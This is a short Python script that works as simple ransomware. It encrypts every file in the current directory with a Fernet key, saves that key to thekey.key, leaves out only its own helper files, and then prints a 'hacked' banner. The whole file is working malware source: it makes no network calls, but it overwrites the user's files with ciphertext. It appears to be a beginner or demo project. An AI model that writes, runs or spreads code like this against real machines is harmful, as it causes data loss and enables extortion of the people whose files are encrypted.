import os
from cryptography.fernet import Fernet
from text import hacked

def get_files():
    exclude_files = ["encrypt.py", "thekey.key", "decrypt.py", "text.py"]
    files = [file for file in os.listdir() if file not in exclude_files and os.path.isfile(file)]
    return files

def generate_key():
    key = Fernet.generate_key()
    with open("thekey.key", "wb") as thekey:
        thekey.write(key)

    return key

def encrypt_files(files, key):
    for file in files:
        with open(file, "rb") as thefile:
            content = thefile.read()
        encrypted_content = Fernet(key).encrypt(content)
        with open(file, "wb") as thefile:
            thefile.write(encrypted_content)

def main():
    try:
        files = get_files()
        key = generate_key()
        encrypt_files(files, key)
        print(hacked)

    except Exception as e:
        print(f"A problem occured: {e}.")

if __name__ == "__main__":
    main()
